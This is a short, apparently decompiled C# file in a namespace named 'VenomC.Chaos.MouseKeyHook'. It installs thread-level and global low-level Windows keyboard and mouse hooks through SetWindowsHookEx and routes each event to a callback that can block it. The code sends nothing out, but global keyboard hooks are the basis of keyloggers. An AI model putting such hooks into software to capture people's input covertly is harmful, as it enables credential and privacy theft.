using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using VenomC.Chaos.MouseKeyHook.WinApi;

internal static class Class21
{
	[CompilerGenerated]
	private sealed class Class22
	{
		public Delegate13 delegate13_0;

		internal IntPtr method_0(int code, IntPtr param, IntPtr lParam)
		{
			return smethod_6(code, param, lParam, delegate13_0);
		}
	}

	[CompilerGenerated]
	private sealed class Class23
	{
		public Delegate13 delegate13_0;

		internal IntPtr method_0(int code, IntPtr param, IntPtr lParam)
		{
			return smethod_6(code, param, lParam, delegate13_0);
		}
	}

	public static HookResult smethod_0(Delegate13 callback)
	{
		return smethod_4(7, callback);
	}

	public static HookResult smethod_1(Delegate13 callback)
	{
		return smethod_4(2, callback);
	}

	public static HookResult smethod_2(Delegate13 callback)
	{
		return smethod_5(14, callback);
	}

	public static HookResult smethod_3(Delegate13 callback)
	{
		return smethod_5(13, callback);
	}

	private static HookResult smethod_4(int hookId, Delegate13 callback)
	{
		GDelegate5 gDelegate = (int code, IntPtr param, IntPtr lParam) => smethod_6(code, param, lParam, callback);
		Class26 @class = Class25.SetWindowsHookEx(hookId, gDelegate, IntPtr.Zero, Class31.GetCurrentThreadId());
		if (@class.IsInvalid)
		{
			smethod_8();
		}
		return new HookResult(@class, gDelegate);
	}

	private static HookResult smethod_5(int hookId, Delegate13 callback)
	{
		GDelegate5 gDelegate = (int code, IntPtr param, IntPtr lParam) => smethod_6(code, param, lParam, callback);
		Class26 @class = Class25.SetWindowsHookEx(hookId, gDelegate, Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		if (@class.IsInvalid)
		{
			smethod_8();
		}
		return new HookResult(@class, gDelegate);
	}

	private static IntPtr smethod_6(int nCode, IntPtr wParam, IntPtr lParam, Delegate13 callback)
	{
		if (nCode != 0)
		{
			return smethod_7(nCode, wParam, lParam);
		}
		Struct17 data = new Struct17(wParam, lParam);
		if (!callback(data))
		{
			return new IntPtr(-1);
		}
		return smethod_7(nCode, wParam, lParam);
	}

	private static IntPtr smethod_7(int nCode, IntPtr wParam, IntPtr lParam)
	{
		return Class25.CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
	}

	private static void smethod_8()
	{
		throw new Win32Exception(Marshal.GetLastWin32Error());
	}
}
